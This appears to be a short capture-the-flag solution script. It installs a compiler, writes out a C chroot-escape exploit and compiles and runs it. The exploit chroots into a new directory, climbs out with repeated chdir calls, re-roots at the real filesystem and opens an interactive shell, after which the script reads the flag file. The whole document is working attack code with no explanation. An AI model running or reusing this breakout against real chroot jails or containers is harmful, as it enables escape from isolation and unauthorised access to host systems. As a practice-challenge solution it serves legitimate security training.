2ff6b0b9733a294cb0e0aeb7269dea5ae05d2a2de569e8464b5967c6c207548e
apk add gcc musl-dev
cat << EOF > exploit.c
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>

void die(char *msg) {
	perror(msg);
	exit(1);
}

int main(int argc, char *argv[])
{
	int i;
	
	if (chdir("/") != 0)
		die("chdir(/)");
	
	if (mkdir("baz", 0777) != 0)
		die("mkdir(baz)");
	
	if (chroot("baz") != 0)
		die("chroot(baz)");
	
	for (i=0; i<50; i++) {
		if (chdir("..") != 0)
			die("chdir(..)");
	}
	
	if (chroot(".") != 0)
		die("chroot(.)");
	
	printf("Exploit seems to work. =)\n");
	
	execl("/bin/sh", "sh", "-i", (char *)0);
	die("exec sh");
	
	exit(0);
}
EOF
gcc exploit.c
./a.out
cat /pwn/flag.txt
